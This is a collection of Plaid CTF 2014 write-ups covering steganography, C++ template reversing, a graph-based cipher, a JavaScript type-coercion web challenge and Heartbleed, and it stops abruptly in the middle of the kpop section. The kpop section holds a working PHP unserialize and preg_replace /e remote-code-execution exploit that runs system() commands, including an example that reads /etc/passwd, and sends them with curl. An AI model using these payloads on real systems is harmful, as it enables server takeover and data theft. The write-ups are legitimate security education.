* <https://fail0verflow.com/blog/2014/plaidctf2014-for250-curlcore.html>
* <https://docs.google.com/a/google.com/file/d/0B1Q3-q0eaImNSlNJbTNKVzNtV3c/edit>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/forensics/curlcore)

# Plaid CTF 2014: doge_stege

**Category:** Forensics
**Points:** 100
**Description:**

> You were startled to learn the The Plague has been behind many of the most popular internet memes. We believe he hides information in these funny pictures with steganography in order to broadcast his messages through time without detection. Find the [hidden message](doge_stege-bcea78ed7ce3588f89b56f125866c1e2.tar.bz2), stop the signal.

## Write-up

_This write-up is made by Steven of the [HacknamStyle](http://hacknamstyle.net/) CTF team._

Inspecting the PNG shows:

```bash
$ file doge_stege.png
doge_stege.png: PNG image data, 680 x 510, 8-bit colormap, non-interlaced
```

An 8-bit colormap is a typical place where things are hidden in a steganography challenge. After some lazy searching, we find a tool to change the palette (or colormap) of a PNG using Python [on Stack Overflow](http://stackoverflow.com/a/1214765/96656).

[`change_palette.py`](change_palette.py) is modified to allow us to write out 256 images, each one highlighting a single entry in white while blacking out the others:

```bash
$ for i in {0..255}; do ./change_palette.py doge_stege.png "single-color-${i}.png" "${i}"; done
```

All the resulting images can be found in [`single.tar.gz`](single.tar.gz). Going through these images, we notice that on `single-color-127.png`, some unseen text appears:

![](single-color-127.png)

Other images show similar fragments of text. Clearly, the message is composed of multiple entries in the colormap. [`change_palette.py`](change_palette.py) is modified again (uncomment the correct line) to now highlight a range of colormap entries starting from `127` onwards:

```bash
$ for i in {0..128}; do ./change_palette.py doge_stege.png "range-color-127+${i}.png" "${i}"; done
```

All these images can be found in [`range.tar.gz`](range.tar.gz). In e.g. `range-color-127+54.png`, the full message becomes readable:

![](range-color-127+54.png)

The flag is `pctf{keep_doge_alive_2014}`.

## Other write-ups

* <https://ucs.fbi.h-da.de/writeup-plaidctf-2014-doge-stege/>
* <http://csrc.tamuc.edu/css/?p=156>
* <https://cesena.ing2.unibo.it/2014/04/14/plaidctf-2014-doge_stege-forensic-100/>
* <https://fail0verflow.com/blog/2014/plaidctf2014-for100-doge_stege.html>

# Plaid CTF 2014: ezhp

**Category:** Pwnables
**Points:** 200
**Description:**

> Luckily when you travel back in time, you still get to use all your knowledge from the present. With that knowledge in hand, breaking into [this service](ezhp-b502addeb274f41757555c05b08e3b05.tar.bz2) (at 54.81.149.239:9174) owned by The Plague shouldn't be hard at all.
>
> Hint: the heap allocator is *really, really bad*.

## Write-up

(TODO)

## Other write-ups and resources

* <http://x86overflow.blogspot.com/2014/04/plaidctf-pwnable-200-ezhp.html>
* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug>
* <https://fail0verflow.com/blog/2014/plaidctf2014-pwn200-ezhp.html>
* [Solution in Python](https://github.com/t00sh/ctf/blob/master/plaidctf_2014/ezhp.pl)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/ezhp)

# Plaid CTF 2014: Freya

**Category:** Misc
**Points:** 250
**Description:**

> We've traveled back far, but this protocol looks familiar... Our reconnaissance team did a great job, they got us [a data capture from the currently running systems and a private key](freya-378469981a7016d6179a844fffe2a82b.tar.bz2) from the server (shell.woo.pctf which resolves to 54.226.73.167). Take a look at the traffic our reconnaissance team picked up, and see if you can get access to The Plague's server, at 54.226.73.167.

## Write-up

(TODO)

## Other write-ups

* <http://blog.dragonsector.pl/2014/04/plaidctf-2014-gcc-300-and-freya-250.html>
* <https://fail0verflow.com/blog/2014/plaidctf2014-misc250-freya.html>

# Plaid CTF 2014: g++

**Category:** Reversing
**Points:** 200
**Description:**

> Although it seems like The Plague's projects are open source, it's not quite so simple to figure out what the source code does. We believe [this project](g++-30f6a74ce24ea3605ba7cbec92222a72.tar.bz2) is supposed to print out secret information, but the KEY variable in the Makefile has been lost. Find the key, build the project, get us the information.

## Write-up

_This write-up is made by Xor0X of [HacknamStyle](http://hacknamstyle.net/)._

In the `Makefile` a key can be configured. Using a simple script the key is converted to the header file `key.h`. The character at index `i` with ASCII value `v` is encoded as `K(i, v)`. So the password `test` becomes:

```
K(0,116) // 't'
K(1,101) // 'e'
K(2,115) // 's'
K(3,116) // 't'
```

In `solveme.cpp` this key is then stored using template specialization:

```cpp
template <int i> struct key { S r = 0; };
#define K(i,v) template<> struct key<i> { S r = v; };
```

Hence using `key<i>::r` will return the key at position `i` (or `0` when the index is out of range). The code in `solveme.cpp` continues to use C++ [template metaprogramming](https://en.wikipedia.org/wiki/Template_metaprogramming) to verify this password at compile time. At runtime it checks the result of the compile time operation, and says if they key was correct or not:

```cpp
int main() {
  if (!vv<0>::r)
    // print 16 characters (aka the key)
  else
    std::cout << "Wrong\n";
  return 0;
}
```

From this we can tell the key is 16 characters long. Now we have to reverse engineer all the `#define`s and templates. This can be done by slowly refactoring them. This is tedious work, and we want to be sure our modifications are correct. The first option is to print out the result of `vv<0>::r` and assure our changes do not modify it. We can do better though. Take a look at how `vv<0>::r` is calculated:

```cpp
template <int n> struct vvv { S r = gg<n>::r|gg<n+1>::r|gg<n+2>::r|gg<n+3>::r; };
template <int n> struct vv { S r = vvv<0>::r|vvv<4>::r|vvv<8>::r|vvv<12>::r; };
```

We learn that the value `vv<0>::r` is based on the values `gg<i>::r` with `i` ranging between `0` and `15`. So we can print all the `gg<i>::r` values and assure they never change when we refactor the code. Remark that `vv<0>::r` is zero (and the password is correct) if and only if all the `gg<i>::r` are zero.

### Reversing Results

Reversing the `#define`s is left as an exercise for the reader (they are boring to read about anyway). In the end the definition of `gg` becomes:

```cpp
// 0 <= n <= 15
template <int n> struct gg {
  static const int r = (((hiddenkey<n,n|2>::r)) % 257) - makefilekey<(n>>2),((n)&3)>::rr;
};
```

We can see that both operands of the subtraction must be zero for the key to be valid. Furthermore, `makefilekey` depends on the key supplied in the `Makefile`, while `hiddenkey` only depends on data present in `solveme.cpp`. We don’t need to know how `hiddenkey` is calculated, we simply extract the values for all `n`. Now we want to find a key so that `gg<i>::r` is zero for all `i`. This means `makefilekey<(n>>2),((n)&3)>` must match `hiddenkey<n,n|2>::r` for `n` between `0` and `15`. So how is `makefilekey<a,b>::r` computed?

```cpp
template <int a, int b> struct makefilekey
{
  static const int rr = (lookup<(a)*4>::r * key<b>::r
                      + lookup<(a)*4+1>::r * key<b+4>::r
                      + lookup<(a)*4+2>::r * key<b+8>::r
                      + lookup<(a)*4+3>::r * key<b+12>::r) % 257;
};
```

Here `lookup` only depends on internal data in `solveme.cpp`. What’s crucial here is that `makefilekey<a,b>::r` only depends on four key bytes. In turn this means that `gg<0>::r`, `gg<4>::r`, `gg<8>::r`, and `gg<12>::r` depend only on `key<0>`, `key<4>`, `key<8>`, and `key<12>`. Hence these four key bytes can be bruteforced independently. The same is true for `key<1>`, `key<5>`, `key<9>`, and `key<13>`: They can also be bruteforced independent of the other bytes. In fact we can bruteforce the complete password in groups of four bytes. This is done by extracting the value of `lookup`, performing the calculation in `makefilekey`, and checking if they match the corresponding `hiddenkey` values.

My fully simplified solution can be found in [`solveme-simplified.cpp`](solveme-simplified.cpp).

### Solution

This solution bruteforces the keys in groups of four bytes:

```cpp
#include <stdio.h>

static const int hiddenkey_table[] = {
  15, 25, 172, 31, 100, 17, 225, 137,
  162, 71, 187, 191, 11, 105, 176, 94
};

static const int lookup_table[] = {
  13, 68, 87, 202, 29, 244, 71, 122,
  173, 228, 247, 42, 125, 148, 39, 90
};

static int calc_makefilekey(const char *password, int n) {
  int a = n / 4;
  int b = n % 4;

  return (lookup_table[a*4] * password[b] + lookup_table[a*4+1] * password[b+4]
    + lookup_table[a*4+2] * password[b+8] + lookup_table[a*4+3] * password[b+12]) % 257;
}

int main() {
  char crackedpw[20] = {0};

  // Crack key in groups of 4 chars at once
  for (int off = 0; off < 4; ++off) {
    bool found = false;
    printf("Cracking at offset %d...\n", off);

    for (int c1 = ' '; !found && c1 <= '~'; ++c1) {
      crackedpw[off] = c1;
      for (int c2 = ' '; !found && c2 <= '~'; ++c2) {
        crackedpw[off+4] = c2;
        for (int c3 = ' '; !found && c3 <= '~'; ++c3) {
          crackedpw[off+8] = c3;
          for (int c4 = ' '; !found && c4 <= '~'; ++c4) {
            crackedpw[off+12] = c4;

            if (
              calc_makefilekey(crackedpw, off) == hiddenkey_table[off]
              && calc_makefilekey(crackedpw, off+4) == hiddenkey_table[off+4]
              && calc_makefilekey(crackedpw, off+8) == hiddenkey_table[off+8]
              && calc_makefilekey(crackedpw, off+12) == hiddenkey_table[off+12]
            ) {
              found = true;
            }
          }
        }
      }
    }
  }

  printf("Cracked password: %s\n", crackedpw);
}
```

The solution is `C++_m0re_lyk_C--`.

### Comments

You can also solve this by constructing and solving the linear equations (with the key bytes as unknowns). For example, for the key bytes at position 0, 4, 8, and 12 we have the linear equations:

```
( 13 * k0 +  68 * k4 +  87 * k8 + 202 * k12) Mod 257 =  15
( 29 * k0 + 244 * k4 +  71 * k8 + 122 * k12) Mod 257 = 100
(173 * k0 + 228 * k4 + 247 * k8 +  42 * k12) Mod 257 = 162
(125 * k0 + 148 * k4 +  39 * k8 +  90 * k12) Mod 257 =  11
```

Using the `gaussJordan.py` file [found here](http://anh.cs.luc.edu/331/code/) we can solve this system using Python:

```python
>>> import guassJordan as gj
>>> A = [[13, 68, 87, 202, 15],
     [29, 244, 71, 122, 100],
     [173, 228, 247, 42, 162],
     [125, 148, 39, 90, 11]]
>>> t = gj.matConvert(A, gj.ZMod(257))
>>> gj.gauss_jordanExactField(t)
True
>>> t
[[Mod(1, 257), Mod(0, 257), Mod(0, 257), Mod(0, 257), Mod(67, 257)],
 [Mod(0, 257), Mod(1, 257), Mod(0, 257), Mod(0, 257), Mod(109, 257)],
 [Mod(0, 257), Mod(0, 257), Mod(1, 257), Mod(0, 257), Mod(95, 257)],
 [Mod(0, 257), Mod(0, 257), Mod(0, 257), Mod(1, 257), Mod(95, 257)]]
>>> chr(67), chr(109), chr(95), chr(95)
('C', 'm', '_', '_')
```

These characters match the solution of our bruteforce attack. Note that the Python files required to run this have been mirrored in the directory of this write-up.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-re200-gxx.html>
* <https://docs.google.com/a/google.com/document/d/1jo_taidfAJsCbWUIpU9dYryhtTQr5YLON7BnIr0WN-k/edit>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/reversing/g%2B%2B)

# Plaid CTF 2014: gcc

**Category:** Reversing
**Points:** 300
**Description:**

> This is bad. Very bad. You travel back in time, only to see that The Plague has finagled his way to the gcc dev team. What sort of mischief he can cause for the future from this point of power is hard to say... find out what he's up to immediately! [Here](gcc-1f056eb86b487b65ad92d89738ec5edc.tar.gz)'s a copy of GCC. We're pretty sure he's running something at <https://107.21.133.9/>.

## Write-up

(TODO)

## Other write-ups

* <http://blog.dragonsector.pl/2014/04/plaidctf-2014-gcc-300-and-freya-250.html>

# Plaid CTF 2014: graphs

**Category:** Crypto
**Points:** 200
**Description:**

> In this era, block ciphers hadn't even been invented. The Plague created [this system](graphs-0011fa3a98e9d40d4a671807eb817ca0.tar.bz2) based on problems he knew to be NP hard, but there must be something you can do to decode his messages.

## Write-up

So, first of all, what are our files?

* Ciphertext - encoded array of 1024 big numbers.
* Plaintext - the sum of 64 numbers from the cleartext.
* Public key - encoded graph (list of lists).
* Private key - indexes of numbers in the cleartext, which generate a cleartext.
* A `genkey.py` script that performs the encryption.

So we have the public key with 1024 vertices, but we need only 64 of them.

Let’s take a closer look at how the key generation works:

```py
vertices = range(self.keylen)
privkey = random.sample(vertices,self.keylen>>4)
#privkey = random 64 vertices

tocover = set(vertices).difference(set(privkey))
#tocover = all others vertices

G = [0]*self.keylen
for v in vertices:
  G[v] = []
#just graph init

#!!! the most important part !!!
while len(tocover) > 0:
  src = random.choice(privkey)
  dst = random.choice(list(tocover))
  G[src].append(dst)
  G[dst].append(src)
  tocover = tocover.difference(set([dst]))
```

So `len(tocover) = 1024 - 64 = 960`. Let’s take 2 random vertices, 1 from the private key, 1 from the `tocover` set, and we ‘connect’ them. We can then compute lengths of private keys vertices (count of connected element) = 960 / 64 = 15 (will be same for all `keylen`). Now we know, that our `privkey` vertices have 15 elements, but what with others?

```py
others = list(set(vertices).difference(set(privkey)))
for o in others:
  for n in others:
    if random.getrandbits(5) == 0:
      if o not in G[n]:
        G[n].append(o)
        G[o].append(n)
```

We connect two vertices `o` and `n` only in 1/32 of all cases (`if random.getrandbits(5) == 0`). But our graph is symmetric, so actually it’s in 1/16 of all cases. Okay, so for every vertice `o` we have about `960 / 16 = 60` connected elements versus 15 elements in private key.

Now we need only get indexes of 64 vertices with the smallest count of connected elements. I did it this way:

```py
privkey = []
for index, el in enumerate(self.pubkey):
  if len(el) <= 30:
    privkey.append(index)
self.privkey = privkey
```

Let’s decrypt the ciphertext using that key `2275629599429195325551385405029036171782046085131052214556340540961662`. The cleartext is:

```
The flag is: 3veryb0dy_poops~
```

The flag is `3veryb0dy_poops~`.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-crypto200-graphs.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/crypto/graphs)

# Plaid CTF 2014: halphow2js

**Category:** Web
**Points:** 200
**Description:**

> Javascript is everywhere. But there is [one strange javascript blob](https://54.196.246.17:8001/) we have been seeing pop up on servers throughout the ages. We're pretty sure The Plague must be involved.
>
> Note: we know the cert displays a warning - that isn't important.

## Write-up

[The HTML source for the website linked to in the description](index.html) reveals [`script.js`](script.js), a polyglot JavaScript file that runs in both the browser and in Node.js.

Reading through the code makes it clear that the client-side section of the script prompts the user for input five times, and then submits that data to the server. If the input matches certain conditions, the flag is returned, else, the process starts over.

The data is sent using a GET request to `https://54.196.246.17:8001/myajax?x=1&y=2&z=3&w=4&ww=5`. The server-side section of the script validates these URL query string parameters as follows: if `FLAG` (a value unknown to us) is equal to `filter(query.x, query.y, query.z, query.w, query.ww)`, then the flag is revealed.

Let’s take a closer look at that `filter` function:

```js
function filter() {
  var args = [].slice.apply(arguments).sort().filter(function(x, i, a) {
    return a.indexOf(x) == i;
  });
  if (args.length != 5) return "uniq";

  var flag = false;
  args.map(function(x) {
    flag |= x >= 999;
  });
  if (flag) return "big";

  var m = args.map(mystop);

  if (m.filter(function(x, i) { return m[2] + 3 * i == x; }).length < 3) {
    return "unsexy";
  }
  if (m.filter(function(x, i) { return x == args[i]; }).length < 3) {
    return "hippopotamus";
  }
  if (m.filter(function(x, i) { return x > m[i-1]; }).length > 3) {
    return "banana phone";
  }

  return FLAG;
}
```

We can make the following observations:

* First, the arguments are lexicographically sorted. This effectively means that `?x=1&y=2&z=3&w=4&ww=5` and `?x=5&y=4&z=3&w=2&ww=1` have the same effect, which reduces the number of combinations to test in a brute-force scenario.
* It takes exactly five unique arguments. If not, the function exits early, and we won’t get to the flag. Once again, this makes brute-forcing a bit easier.
* If for any of the arguments `x` the expression `x >= 999` holds true, the function exits early, and we won’t get to the flag.
* `mystop(x)` is then called for each argument `x`, which can take several minutes depending on the value of `x`. The resulting list of arguments (`m`) must match certain conditions, else the function exits early, and we won’t get to the flag.

At this point it’s tempting to start bruteforcing by sending all possible sets of five numeric values below `999` to the server. That’s several trillions of possible combinations, though… It also doesn’t help that the server-side code only sends a response after at least 2 seconds. Brute-forcing is not exactly feasible for this challenge.

Remember the `query.x`, `query.y`, `query.z`, `query.w`, and `query.ww` values that are validated on the server-side? [They’re string values](http://nodejs.org/api/querystring.html#querystring_querystring_parse_str_sep_eq_options), and the script never explicitly casts them into numbers. This means we can pick any string values `x` for the parameters, as long as `x >= 999` evaluates to `false`.

So instead of trying to find the perfect combination of numbers, we can just pick any five strings that can be coerced into numbers, and then format them in different ways until all validation checks are passed. For example, the number `5` can also be written as `5.`, `5.0`, `5.00`, or `5e0` in JavaScript. And because the values are strings that are coerced to numbers (equivalent to `Number(string)`) we can even pad the values with whitespace, e.g. `" 5"` or `"5 "` instead of `"5"`.

After some manual fiddling with various numbers and formats, we found a working set of values:

```js
// This code assumes the `filter` function and its dependencies are declared as
// in the provided `script.js`.
var FLAG = 'Congratulations!';
console.log(filter('2.0', '2.00', '2.000', '7', '76'));
// → 'Congratulations!'
```

Now we can open <https://54.196.246.17:8001/> and enter the values one by one, after which the flag is shown in an alert box. But using `curl` is simpler:

```bash
$ curl --insecure 'https://54.196.246.17:8001/myajax?x=2.0&y=2.00&z=2.000&w=7&ww=76'
w00t_i_are_mastar_web_hackar
```

The flag is `w00t_i_are_mastar_web_hackar`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/04/plaidctf-halphow2js-writeup.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/halphow2js)

# Plaid CTF 2014: harry_potter

**Category:** Pwnables
**Points:** 300
**Description:**

> If only we could get into [this system](harry_potter-2e0391597fb1d20ebf79b7d77c21b06e.tar.bz2), running at 54.198.150.4:666, we might get an idea of where The Plague has been keeping the Prime Factorizer.

## Write-up

(TODO)

## Other write-ups

* <http://eindbazen.net/2014/04/plaidctf-2014-harry_potter-300/>
* <http://blog.accuvant.com/jdrakeaccuvant/plaid-ctf-2014-harry_potter-challenge/>

# Plaid CTF 2014: Heartbleed

**Category:** Misc
**Points:** 10
**Description:**

> Our hearts are bleeding. But instead of bleeding password bytes, they're bleeding flags. Please recover our flags so we don't bleed to death before we can update to 1.0.1-g. Site is up at <https://54.82.147.138:45373/>.
>
> (The flag format is `flag{...}`.)

## Write-up

The challenge name makes it pretty clear that the server is vulnerable to the [the Heartbleed bug](http://heartbleed.com/). Let’s use the famous [Heartbleed proof of concept script](heartbleed.py) and see what kind of data the server leaks:

```bash
$ ./heartbleed.py -p 45373 54.82.147.138
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 837
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
	0000: 02 40 00 66 6C 61 67 7B 68 65 79 5F 67 75 69 73  .@.flag{hey_guis
	0010: 65 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72  e_we_made_a_hear
	0020: 74 62 6C 65 65 64 7D 00 66 6C 61 67 7B 68 65 79  tbleed}.flag{hey
	0030: 5F 67 75 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61  _guise_we_made_a
	0040: 5F 68 65 61 72 74 62 6C 65 65 64 7D 00 66 6C 61  _heartbleed}.fla
	0050: 67 7B 68 65 79 5F 67 75 69 73 65 5F 77 65 5F 6D  g{hey_guise_we_m
	0060: 61 64 65 5F 61 5F 68 65 61 72 74 62 6C 65 65 64  ade_a_heartbleed
	0070: 7D 00 66 6C 61 67 7B 68 65 79 5F 67 75 69 73 65  }.flag{hey_guise
	0080: 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72 74  _we_made_a_heart
	0090: 62 6C 65 65 64 7D 00 66 6C 61 67 7B 68 65 79 5F  bleed}.flag{hey_
	00a0: 67 75 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61 5F  guise_we_made_a_
	…
	3fc0: 66 6C 61 67 7B 68 65 79 5F 67 75 69 73 65 5F 77  flag{hey_guise_w
	3fd0: 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72 74 62 6C  e_made_a_heartbl
	3fe0: 65 65 64 7D 00 66 6C 61 67 7B 68 65 79 5F 67 75  eed}.flag{hey_gu
	3ff0: 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65  ise_we_made_a_he

WARNING: server returned more data than it should; server is vulnerable!
```

The flag is `flag{hey_guise_we_made_a_heartbleed}`.

## Other write-ups and resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/heartbleed)

# Plaid CTF 2014: hudak

**Category:** Reversing
**Points:** 250
**Description:**

> Can you reverse [this program](hudak-c3c6dd04f699cc01c0d4f547f2155ddf.tar.bz2) and find out what The Plague was working on?

## Write-up

(TODO)

## Other write-ups and resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/reversing/hudak)

# Plaid CTF 2014: jackshit

**Category:** Pwnables
**Points:** 200
**Description:**

> You have travelled back in time only to find The Plague has secured [his services](jackshit-986d2961b93c3db2688f754fd7d8298e.gz) (at 54.198.56.199:1282) with the current state of the art in system call filtering. Can you break in to find a clue as to where he might be?
>
> (This is 32-bit Ubuntu instance, with [this libc](libc-47b4e38cb3c4bce477e52368c50972c8.so.6).)

## Write-up

(TODO)

## Other write-ups and other resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/jackshit)

# Plaid CTF 2014: kappa

**Category:** Pwnables
**Points:** 275
**Description:**

> There's got to be a way to get into [this service](kappa-f2fdf7fcc074cb0c66c3d80a48286450.tar.bz2) set up by the Plague at 54.80.112.128:1313. Can you find it?

## Write-up

(TODO)

```bash
$ nc 54.80.112.128 1313
Thank you for helping test CTF plays Pokemon! Keep in mind that this is currently in alpha which means that we will only support one person playing at a time. You will be provided with several options once the game begins, as well as several hidden options for those true CTF Plays Pokemon fans ;). We hope to expand this in the coming months to include even more features!  Enjoy! :)
Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork
```

```
11:30:24 <saelo> since I couldn't find a writeup, how was kappa supposed to be solved?
11:30:43 <saelo> I got eip control but couldn't really find anything for NX bypass...
11:34:25 <saelo> couldn't find something for stack pivoting + no mmap or similar in plt
11:51:08 <Reinhart> saelo: we constructed an infoleak, found address of system() using that, then set the print_info callback for a pokemon to system(). then make sure the pokemon's name is a shell cmd.
11:51:39 <saelo> Reinhart: cool, that was my idea too, what did you use for the info leak?
11:52:26 <Reinhart> saelo: the attack name was a pointer-to-pointer-to-string, we overwrote it with a pointer to within another pokemon's artwork, then we could change that artwork to leak data up to the next null byte by printing the pokemon
```

## Other write-ups and resources

* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwn-275-kappa-type-confusion-vuln>
* <http://eindbazen.net/2014/04/plaidctf-2014-kappa-275/>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/kappa)

# Plaid CTF 2014: kpop

**Category:** Web
**Points:** 200
**Description:**

> Sometimes, the Plague leaves some of his old stuff up and running. We found a [K-Pop lyrics website](http://54.234.123.205/) the Plague wrote back when he was learning to program. It was [open-source](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2), too! We believe there might be something important in `/home/flag/flag`. Could you get it for us?

## Write-up

[The `/import.php` endpoint](http://54.234.123.205/import.php) has a form that accepts user input. Its source code (part of [the provided tarball](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2)) calls `User::addLyrics($newperms)` when the form is submitted. Here’s the source code for this class:

```php
class User {
  static function addLyrics($lyrics) {
    $oldlyrics = array();
    if (isset($_COOKIE['lyrics'])) {
      $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));
    }
    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;
    setcookie('lyrics', base64_encode(serialize($oldlyrics)));
  }
  static function getLyrics() {
    if (isset($_COOKIE['lyrics'])) {
      return unserialize(base64_decode($_COOKIE['lyrics']));
    }
    else {
      setcookie('lyrics', base64_encode(serialize(array(1, 2))));
      return array(1, 2);
    }
  }
};
```

A-ha! It performs serialization of user-controlled input (the value of the `lyrics` cookie).

[The provided source code](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2) also contains an `OutputFilter` class in `classes.php` that takes two arguments: a pattern and a replacement. These arguments are then passed to `preg_replace()`. If we can somehow manage to use the deprecated `/e` modifier for `preg_replace()`, this would enable remote code execution. [The PHP documentation describes this ‘feature’ as follows](http://php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval):

> If this deprecated modifier is set, `preg_replace()` does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string.

Adding one and one together, it’s possible to craft an exploit that uses the unsafe serialization vulnerability to trigger the remote code execution vulnerability. First, we create a custom value for the `lyrics` cookie. This value must be equal to `base64_encode(serialize($lyrics))` for an instance of any `Lyrics` object.

Let’s make a copy of `classes.php` and save it as [`classes-patched.php`](classes-patched.php). I made a few changes, so that it returns a value for the `lyrics` cookie containing a remote code execution payload:

```diff
--- classes.php	2014-04-11 05:46:37.000000000 +0200
+++ classes-patched.php	2014-04-12 13:33:37.000000000 +0200
@@ -1,5 +1,15 @@
 <?php

+// Modern versions of PHP log this warning:
+// > PHP Deprecated: `preg_replace()`: The `/e` modifier is deprecated, use
+// > `preg_replace_callback` instead in `classes.php` on line 11
+// Turn off all error reporting to avoid this.
+error_reporting(0);
+
+// Allow passing a shell argument containing the desired payload, e.g.
+// $ php classes-patched.php 'cat /etc/passwd'
+$command = isset($argv[1]) ? $argv[1] : 'ls -lsa';
+
 class OutputFilter {
   protected $matchPattern;
   protected $replacement;
@@ -57,9 +67,13 @@
   protected $group;
   protected $url;
   function __construct($name, $group, $url) {
+    global $command;
     $this->name = $name; $this->group = $group;
     $this->url = $url;
-    $fltr = new OutputFilter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>");
+    $fltr = new OutputFilter(
+      "/^./e",
+      'system("' . str_replace('"', '\\"', $command) . '")'
+    );
     $this->logger = new Logger(new LogWriter_File("song_views", new LogFileFormat(array($fltr), "\n")));
   }
   function __toString() {
@@ -156,3 +170,8 @@
   }
 };

+// Create a dummy `Lyrics` instance.
+$song = new Song('name', 'group', 'url');
+$lyric = new Lyrics('lyrics', $song);
+// Get its serialized form, base64-encode it, and print it.
+echo base64_encode(serialize($lyric)) . PHP_EOL;
```

Here’s an example of its output:

```bash
$ php classes-patched.php 'pwd'
Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjY6Imx5cmljcyI7czo3OiIAKgBzb25nIjtPOjQ6IlNvbmciOjQ6e3M6OToiACoAbG9nZ2VyIjtPOjY6IkxvZ2dlciI6MTp7czoxMjoiACoAbG9nd3JpdGVyIjtPOjE0OiJMb2dXcml0ZXJfRmlsZSI6Mjp7czoxMToiACoAZmlsZW5hbWUiO3M6MTA6InNvbmdfdmlld3MiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czo1OiIvXi4vZSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6MTM6InN5c3RlbSgicHdkIikiO319czo3OiIAKgBlbmRsIjtzOjE6IgoiO319fXM6NzoiACoAbmFtZSI7czo0OiJuYW1lIjtzOjg6IgAqAGdyb3VwIjtzOjU6Imdyb3VwIjtzOjY6IgAqAHVybCI7czozOiJ1cmwiO319
/ctfs/write-ups/plaid-ctf-2014/kpop
```

Note that it doesn’t just print the desired cookie value — it also executes the payload on our local system as an unfortunate side effect. To hide this part of the output, we can pipe to `head -n1`:

```bash
$ php classes-patched.php 'pwd' | head -n1
Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjY6Imx5cmljcyI7czo3OiIAKgBzb25nIjtPOjQ6IlNvbmciOjQ6e3M6OToiACoAbG9nZ2VyIjtPOjY6IkxvZ2dlciI6MTp7czoxMjoiACoAbG9nd3JpdGVyIjtPOjE0OiJMb2dXcml0ZXJfRmlsZSI6Mjp7czoxMToiACoAZmlsZW5hbWUiO3M6MTA6InNvbmdfdmlld3MiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czo1OiIvXi4vZSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6MTM6InN5c3RlbSgicHdkIikiO319czo3OiIAKgBlbmRsIjtzOjE6IgoiO319fXM6NzoiACoAbmFtZSI7czo0OiJuYW1lIjtzOjg6IgAqAGdyb3VwIjtzOjU6Imdyb3VwIjtzOjY6IgAqAHVybCI7czozOiJ1cmwiO319
```

Now we can start sending requests to the vulnerable server using the generated cookie value. There’s no need to enter anything in the “data to import” form field.

```bash
$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'ls -lsa' | head -n1)" 'http://54.234.123.205/import.php'
total 52
4 drwxr-xr-x  3 root root 4096 Apr 12 07:55 .
4 drwxr-xr-x 12 root root 4096 Apr 11 19:40 ..
4 -rw-r--r--  1 root root 1150 Apr 11 19:50 add_song.php
8 -rw-r--r--  1 root root 4308 Apr 12 07:55 classes.php
4 -rw-r--r--  1 root root   93 Apr 11 19:50 data.php
4 -rw-r--r--  1 root root  417 Apr 11 19:50 export.php
4 -rw-r--r--  1 root root  864 Apr 11 19:50 import.php
4 -rw-r--r--  1 root root  177 Apr 11 19:41 index.html
4 -rw-r--r--  1 root root  423 Apr 11 19:50 index.php
4 drw-rw-rw-  2 root root 4096 Apr 12 07:52 logs
4 -rw-r--r--  1 root root  454 Apr 11 19:50 song.php
4 -rw-r--r--  1 root root  777 Apr 11 19:50 songs.php
<html>
  <head>
    <title>The Plague's KPop Fan Page - Imported Songs</title>
  </head>
  <body>
    <p>Your songs have been imported! Go back to the <a href="songs.php">songs</a> page to see them!</p>
  </body>
</html>
```

The challenge description mentioned `/home/flag/flag`. What could it be?

```bash
